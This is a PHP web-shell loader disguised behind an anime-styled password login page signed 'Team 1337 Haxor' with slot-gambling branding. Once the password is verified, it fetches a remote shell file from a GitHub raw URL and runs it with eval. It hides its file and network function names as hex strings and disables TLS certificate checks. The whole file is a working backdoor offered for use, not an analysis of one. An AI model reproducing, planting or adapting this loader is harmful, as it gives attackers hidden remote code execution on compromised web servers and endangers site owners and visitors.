<?php
session_start();

$secure_password_hash = '$2y$10$j/dV5gTrAV35C5RypB.xWuEwBbqAAuWhIuEJocG/IPJU5f5YWzXuS'; 
$session_key = hash('sha256', $_SERVER['HTTP_HOST']);

function show_login_form()
{
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anime Secret Portal</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@400;500;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: url('https://domain7264.wordpress.com/wp-content/uploads/2025/06/df8753011cc5c14be5dd241650d23e72_720w.gif') no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
            font-family: 'Poppins', 'Noto Sans JP', sans-serif;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(68, 68, 68, 0) 0%, rgba(37, 116, 252, 0) 100%);
            z-index: 0;
        }
        
        .login-container {
            position: relative;
            z-index: 1;
            width: 420px;
            padding: 50px 40px;
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(12px);
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.15);
            overflow: hidden;
            transform-style: preserve-3d;
            perspective: 1000px;
            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        
        .login-container:hover {
            transform: translateY(-5px);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
        }
        
        .login-container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                to bottom right,
                rgba(255, 255, 255, 0) 0%,
                rgba(255, 255, 255, 0.1) 50%,
                rgba(255, 255, 255, 0) 100%
            );
            transform: rotate(30deg);
            animation: shine 6s infinite;
        }
        
        @keyframes shine {
            0% { transform: rotate(30deg) translate(-30%, -30%); }
            100% { transform: rotate(30deg) translate(30%, 30%); }
        }
        
        .anime-character {
            text-align: center;
            margin-bottom: 30px;
            position: relative;
            z-index: 2;
        }
        
        .anime-character img {
            width: 140px;
            height: 140px;
            border-radius: 50%;
            object-fit: cover;
            border: 4px solidrgb(255, 0, 0);
            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.6);
            transform: translateZ(30px);
            transition: all 0.3s ease;
        }
        
        .anime-character img:hover {
            transform: translateZ(30px) scale(1.05);
            box-shadow: 0 15px 40px rgba(255, 0, 0, 0.8);
        }
        
        .login-title {
            color: #fff;
            text-align: center;
            margin-bottom: 30px;
            font-size: 32px;
            font-weight: 700;
            text-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            position: relative;
            transform: translateZ(20px);
        }
        
        .login-title::after {
            content: '';
            display: block;
            width: 80px;
            height: 4px;
            background: linear-gradient(to right,rgb(255, 0, 0),rgb(51, 6, 6));
            margin: 10px auto 0;
            border-radius: 2px;
        }
        
        .input-group {
            position: relative;
            margin-bottom: 30px;
            transform: translateZ(20px);
        }
        
        .input-group input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            outline: none;
            color: #fff;
            font-size: 16px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
        }
        
        .input-group input:focus {
            background: rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 107, 157, 0.6);
            box-shadow: 0 5px 20px rgba(255, 107, 157, 0.4);
        }
        
        .input-group label {
            position: absolute;
            top: 16px;
            left: 20px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 16px;
            pointer-events: none;
            transition: all 0.3s ease;
        }
        
        .input-group input:focus + label,
        .input-group input:valid + label {
            top: -22px;
            left: 15px;
            font-size: 13px;
            color:rgb(255, 0, 0);
            background: rgba(0, 0, 0, 0.6);
            padding: 2px 8px;
            border-radius: 10px;
        }
        
        .login-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(45deg,rgb(255, 0, 0),rgb(63, 11, 11));
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 20px rgba(255, 107, 157, 0.5);
            position: relative;
            overflow: hidden;
            transform: translateZ(20px);
        }
        
        .login-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }
        
        .login-btn:hover {
            transform: translateZ(20px) translateY(-3px);
            box-shadow: 0 8px 25px rgba(255, 107, 157, 0.7);
        }
        
        .login-btn:hover::before {
            left: 100%;
        }
        
        .login-footer {
            text-align: center;
            margin-top: 30px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
            font-style: italic;
            transform: translateZ(20px);
        }
        
        .particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }
        
        .particle {
            position: absolute;
            background: rgba(255, 255, 255, 0.6);
            border-radius: 50%;
            animation: float linear infinite;
        }
        
        @keyframes float {
            0% {
                transform: translateY(0) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(-100vh) rotate(360deg);
                opacity: 0;
            }
        }
        
        .neon-border {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 20px;
            pointer-events: none;box-shadow: 0 0 15px rgba(255, 107, 157, 0.6);
            animation: pulse 3s infinite alternate;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 15px rgba(255, 107, 157, 0.6); }
            100% { box-shadow: 0 0 30px rgba(255, 0, 0,0.9); }
        }
    </style>
</head>
<body>
    <div class="header">

        <div class="logo-head" title="TOTO SLOT">
            <div class="header-logo">
                <amp-img src="https://domain7264.wordpress.com/wp-content/uploads/2025/07/gif-animation-request-fulfille-unscreen-ezgif.com-crop.gif" width="250" height="59" style="margin-top:0px;"
                    alt="TOTO SLOT"></amp-img>
            </div>
            <div class="particles" id="particles"></div>
    <div class="login-container">
        <div class="neon-border"></div>
        <div class="anime-character">
            <img src="https://domain7264.wordpress.com/wp-content/uploads/2025/07/gemini_generated_image_beye5gbeye5gbeye-1.png" alt="Anime Character">
        </div>
        <h1 class="login-title"> Seo Amatir </h1>
        <form method="post">
            <div class="input-group">
                <input type="password" name="password" required>
                <label>Enter Password</label>
            </div>
            <button type="submit" class="login-btn">Login</button>
        </form>
        <div class="login-footer">
            Team 1337 Haxor 
        </div>
    </div>

    <script>
        // Create floating particles
        const particlesContainer = document.getElementById('particles');
        const particleCount = 30;
        
        for (let i = 0; i < particleCount; i++) {
            const particle = document.createElement('div');
            particle.classList.add('particle');
            
            // Random properties
            const size = Math.random() * 6 + 2;
            const posX = Math.random() * 100;
            const duration = Math.random() * 15 + 10;
            const delay = Math.random() * -20;
            
            particle.style.width = `${size}px`;
            particle.style.height = `${size}px`;
            particle.style.left = `${posX}%`;
            particle.style.animationDuration = `${duration}s`;
            particle.style.animationDelay = `${delay}s`;
            
            particlesContainer.appendChild(particle);
        }
    </script>
</body>
</html>
HTML;
    exit;
}

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function geturlsinfo($destiny) {
    $methods = array(
        hex2str('666f70656e'), 
        hex2str('73747265616d5f6765745f636f6e74656e7473'), 
        hex2str('66696c655f6765745f636f6e74656e7473'), // 
        hex2str('6375726c5f65786563') 
    );

    if (function_exists($methods[3])) {
        $ch = curl_init($destiny);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible)");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $result = $methods[3]($ch);
        curl_close($ch);
        return $result;
    } elseif (function_exists($methods[2])) {
        return $methods[2]($destiny);
    } elseif (function_exists($methods[0]) && function_exists($methods[1])) {
        $handle = $methods[0]($destiny, "r");
        $result = $methods[1]($handle);
        fclose($handle);
        return $result;
    }
    return false;
}

if (!isset($_SESSION[$session_key])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $secure_password_hash)) {
            $_SESSION[$session_key] = true;
        } else {
            show_login_form();
        }
    } else {
        show_login_form();
    }
}

$target_url = 'https://raw.githubusercontent.com/rezahaxor1337/shell/refs/heads/main/biru-1337.txt';
$payload = geturlsinfo($target_url);
if ($payload !== false) {
    eval('?>' . $payload);
}
?>
